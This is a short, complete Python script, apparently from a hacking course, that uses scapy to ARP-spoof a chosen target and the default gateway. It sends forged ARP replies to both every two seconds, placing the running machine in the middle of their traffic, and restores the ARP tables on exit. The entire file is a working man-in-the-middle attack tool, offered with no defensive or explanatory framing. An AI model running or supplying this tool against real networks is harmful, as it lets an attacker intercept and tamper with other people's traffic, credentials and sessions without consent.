#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser(description='ARP spoof some IPs')
    parser.add_argument("-t", "--target", type=str, dest="target", help="Target IP of host on network.")
    parser.add_argument("-g", "--gateway", type=str, dest="gateway", help="Default gateway IP")
    args = parser.parse_args()
    if not args.target:
        parser.error("Please specify target address. Use --help for more info.")
    if not args.gateway:
        parser.error("Please specify a default gateway. Use --help for more info.")
    return args

def spoof(target_ip, spoof_ip):
    """ Sends ARP response to router and target computer to setup spoof"""
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def get_mac(ip):
    """ Returns the requested MAC address of the IP given"""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered_list = scapy.srp(packet, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def restore(destination_ip, source_ip):
    """ Restores the ARP table of target """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

args = get_arguments()


target_ip = args.target
gateway_ip = args.gateway

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("\n[+] Detected CTRL + C ... Restoring ARP tables and Quitting.")